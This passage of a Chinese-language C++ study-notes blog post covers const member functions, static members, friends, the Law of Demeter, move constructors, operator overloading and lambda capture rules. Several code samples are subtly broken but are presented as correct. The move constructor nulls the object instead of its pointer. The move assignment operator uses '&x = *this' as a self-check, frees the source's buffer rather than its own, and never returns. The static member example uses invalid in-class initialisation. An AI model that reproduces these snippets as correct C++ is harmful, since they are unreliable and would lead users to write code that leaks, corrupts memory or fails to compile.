&#123;...&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="const-成员函数"><a href="#const-成员函数" class="headerlink" title="const 成员函数"></a>const 成员函数</h2><p>const 对象不能调用非 const 成员函数，所以<br><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">f(<span class="keyword">const</span> A* pa); <span class="comment">// *pa无法被改变</span></span><br><span class="line">f(<span class="keyword">const</span> A&amp; a); <span class="comment">// a无法被改变</span></span><br></pre></td></tr></table></figure></p>
<p>const 成员函数可以重载，效果[UST]<br><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> <span class="keyword">const</span></span>; <span class="comment">// 谁调用？</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">()</span></span>; <span class="comment">// A a 和 const A a？</span></span><br></pre></td></tr></table></figure></p>
<p>题外话<br><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span>* p / <span class="keyword">int</span> <span class="keyword">const</span> * p; <span class="comment">// *p无法修改</span></span><br><span class="line"><span class="keyword">int</span>* <span class="keyword">const</span> p <span class="comment">// p无法修改</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span>* <span class="keyword">const</span> p <span class="comment">// *p和p均无法修改</span></span><br><span class="line">记忆方式：<span class="keyword">const</span>的右边第一个是*还是p</span><br></pre></td></tr></table></figure></p>
<h2 id="static-成员"><a href="#static-成员" class="headerlink" title="static 成员"></a>static 成员</h2><p>算是 class 的属性，所有对象共享。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class A &#123;</span><br><span class="line">    static int x = 0; // 或者类外 x = 1 都行</span><br><span class="line">    static B b; // 类外定义</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">A::x = 1; // ok</span><br><span class="line">int main() &#123;</span><br><span class="line">    A::x = 1; // error，别的函数看不到这一句</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="友元"><a href="#友元" class="headerlink" title="友元"></a>友元</h2><p>访问 private 和 protected</p>
<p>是<code>数据保护</code>和<code>数据访问效率</code>的折衷</p>
<h2 id="Demeter-法则"><a href="#Demeter-法则" class="headerlink" title="Demeter 法则"></a>Demeter 法则</h2><p>一个类的成员函数除了自己的直接子结构（数据成员），不能依赖于其他类</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> &#123;</span></span><br><span class="line">    <span class="function">A <span class="title">func</span><span class="params">()</span></span>; <span class="comment">// 不遵守 Demeter 法则？</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="转移构造函数"><a href="#转移构造函数" class="headerlink" title="转移构造函数"></a>转移构造函数</h2><p>系统自动调用，用于返回一个对象的时候，节约资源</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">A(A&amp;&amp; x) &#123;</span><br><span class="line">    p = x.p;</span><br><span class="line">    x = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="操作符重载"><a href="#操作符重载" class="headerlink" title="操作符重载"></a>操作符重载</h2><p>作为类的非静态成员函数</p>
<p>单目还是单目，双目还是双目。</p>
<p><em>既作为解引用，又作为乘法，咋办？[UST][CJJ: </em>默认已经作为解引用重载好了，只管乘法就行]</p>
<p>“.”, “.*”, “::”, “?:”, “sizeof” 不能重载</p>
<p>A&amp; operator++(); // 效果++a<br>A operator++(int i); // 效果a++，似乎是个右值表达式，似乎有骚操作</p>
<h3 id="操作符重载-1"><a href="#操作符重载-1" class="headerlink" title="= 操作符重载"></a>= 操作符重载</h3><p>=操作符被隐式重载，但如果类中有 const int 和 int&amp; 成员时，=不会隐式重载。</p>
<p>同拷贝构造函数的理，=操作符同样有即将消亡的对象赋值浪费的问题。<br>改进方法如下，该调用的时候编译器自动调用<br><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">A&amp; <span class="keyword">operator</span>=(A&amp;&amp; x) &#123;</span><br><span class="line">    <span class="keyword">if</span>(&amp;x = *<span class="keyword">this</span>)&#123; <span class="comment">// 防止递归</span></span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span>[] x.p; <span class="comment">// 释放原来的资源</span></span><br><span class="line">    p = x.p; <span class="comment">// 转移资源</span></span><br><span class="line">    x.p = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="new-重载"><a href="#new-重载" class="headerlink" title="new 重载"></a>new 重载</h3><p>作为类的 static 函数重载，static 可以不写<br><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>* <span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="keyword">size_t</span> size)</span> <span class="comment">// size_t size必须有，别的无所谓</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">int</span> x)</span></span></span><br></pre></td></tr></table></figure></p>
<h1 id="第3章-lamda-表达式"><a href="#第3章-lamda-表达式" class="headerlink" title="第3章 lamda 表达式"></a>第3章 lamda 表达式</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">&#123; <span class="keyword">int</span> k,m,n; <span class="comment">//环境变量</span></span><br><span class="line">   ......</span><br><span class="line">   ...[](<span class="keyword">int</span> x)-&gt;<span class="keyword">int</span> &#123; <span class="keyword">return</span> x*x; &#125;... <span class="comment">//不能使用k、m、n</span></span><br><span class="line">   ...[&amp;](<span class="keyword">int</span> x)-&gt;<span class="keyword">int</span> &#123; k++; m++; n++; </span><br><span class="line">               <span class="keyword">return</span> x+k+m+n; &#125;... <span class="comment">//k、m、n可以被修改</span></span><br><span class="line">   ...[=](<span class="keyword">int</span> x)-&gt;<span class="keyword">int</span> &#123; <span class="keyword">return</span> x+k+m+n; &#125;...</span><br><span class="line">					<span class="comment">//k、m、n不能被修改</span></span><br><span class="line">   ...[&amp;,n](<span class="keyword">int</span> x)-&gt;<span class="keyword">int</span> &#123; k++; m++; </span><br><span class="line">                         <span class="keyword">return</span> x+k+m+n; &#125;... <span class="comment">//n不能被修改</span></span><br><span class="line">   ...[=,&amp;n](<span class="keyword">int</span> x)-&gt;<span class="keyword">int</span> &#123; n++; <span class="keyword">return</span> x+k+m+n; &#125;... </span><br><span class="line">                                          <span class="comment">//n可以被修改</span></span><br><span class="line">   ...[&amp;k,m](<span class="keyword">int</span> x)-&gt;<span class="keyword">int</span> &#123; k++; <span class="keyword">return</span> x+k+m; &#125;...   </span><br><span class="line">                                    <span class="comment">//只能使用k和m，k可以被修改</span></span><br><span class="line">   ...[=] &#123; <span class="keyword">return</span> k+m+n; &#125;... <span class="comment">//没有参数，返回值类型为int</span></span><br><span class="line">				</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
</search>
